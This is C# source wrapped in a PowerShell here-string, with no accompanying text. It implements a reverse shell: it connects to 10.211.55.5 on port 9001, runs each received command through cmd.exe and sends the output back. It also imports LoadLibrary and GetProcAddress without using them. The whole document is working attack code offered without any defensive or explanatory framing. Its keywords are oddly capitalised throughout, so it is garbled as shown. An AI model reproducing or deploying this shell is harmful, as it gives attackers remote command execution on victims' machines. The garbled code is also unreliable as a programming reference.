$c = @"
Using System;
Using System.Runtime.InteropServices;
Using System.Net;
Using System.Net.Sockets;
Using System.Text;
Using System.Diagnostics;
Public class G {
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);
Public static void S() {
Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
S.Connect(new IPEndPoint(IPAddress.Parse("10.211.55.5"), 9001));
Byte[] b = new byte[8192];
While (true) {
Int i = s.Receive(b);
String cmd = Encoding.ASCII.GetString(b, 0, i).Trim();
If (cmd == "exit") break;
Process p = new Process();
P.StartInfo.FileName = "cmd.exe";
P.StartInfo.Arguments = "/c " + cmd;
P.StartInfo.UseShellExecute = false;
P.StartInfo.RedirectStandardOutput = true;
P.StartInfo.RedirectStandardError = true;
P.Start();
String out_data = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
S.Send(Encoding.ASCII.GetBytes(out_data + "\n"));
        }
    }
}
"@
